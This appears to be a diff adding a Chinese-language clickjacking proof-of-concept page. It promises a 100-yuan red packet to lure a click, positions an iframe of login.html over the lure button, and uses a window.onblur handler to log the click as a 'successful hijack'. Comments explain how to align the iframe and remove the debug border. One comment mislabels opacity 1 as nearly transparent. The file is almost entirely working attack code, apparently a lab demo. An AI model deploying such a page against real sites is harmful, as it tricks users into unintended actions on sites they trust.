@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <title>攻击页面</title>
+    <style>
+        body { text-align: center; padding-top: 50px; }
+        /* 诱饵内容 */
+        #lure-content { position: relative; z-index: 1; }
+        #lure-content h1 { color: #d9534f; }
+        #lure-button { padding: 20px 40px; font-size: 2em; cursor: pointer; background-color: #28a745; color: white; border: none; border-radius: 8px;}
+        #feedback-image { margin-top: 30px; width: 400px; height: 300px; border: 2px dashed #ccc; background-color: #f0f0f0; }
+        .logs { margin: 20px auto; width: 80%; max-width: 600px; height: 150px; background: #333; color: #0f0; font-family: monospace; overflow-y: auto; text-align: left; padding: 10px; white-space: pre-wrap; }
+
+        /* iframe 陷阱 - 这是核心 */
+        #victim-iframe {
+            position: absolute;
+            /* !!! 下面的 top 和 left 需要你手动调整来对齐按钮 !!! */
+            top: 150px;
+            left: calc(50% - 75px); /* 简易居中对齐 */
+
+            width: 150px; /* iframe 尺寸 */
+            height: 50px;
+
+            opacity: 1; /* 几乎完全透明，但仍可交互 */
+            z-index: 10;   /* 确保在最顶层 */
+            border: 2px solid red; /* 调试时使用，完成后移除或注释掉 */
+        }
+    </style>
+</head>
+<body>
+
+<div id="lure-content">
+    <h1>天降好礼！</h1>
+    <button id="lure-button">点我领取100元红包！</button>
+    <img id="feedback-image" src="placeholder.jpg" alt="攻击结果反馈">
+</div>
+
+<!-- 看不见的陷阱 -->
+<iframe id="victim-iframe" src="login.html"></iframe>
+
+<div class="logs">
+    <h3>前端日志:</h3>
+    <pre id="log-output">等待操作...</pre>
+</div>
+
+<script>
+    const logOutput = document.getElementById('log-output');
+    function log(message) {
+        console.log(message);
+        logOutput.textContent += `\n${new Date().toLocaleTimeString()}: ${message}`;
+    }
+
+    // 关键：监听窗口失去焦点的事件
+    window.onblur = function() {
+        log('检测到点击！劫持成功！');
+
+        // 1. 切换图片，模拟“截图”
+        document.getElementById('feedback-image').src = 'success.jpg'; // 准备一张名为 success.jpg 的图片
+
+        // 2. 更新诱饵按钮的文本，防止用户重复点击
+        document.getElementById('lure-button').textContent = '奖励已领取！';
+        document.getElementById('lure-button').disabled = true;
+
+        // 3. (重要) 移除监听器，防止后续的窗口失焦也触发此操作
+        window.onblur = null;
+    };
+</script>
+</body>
+</html>
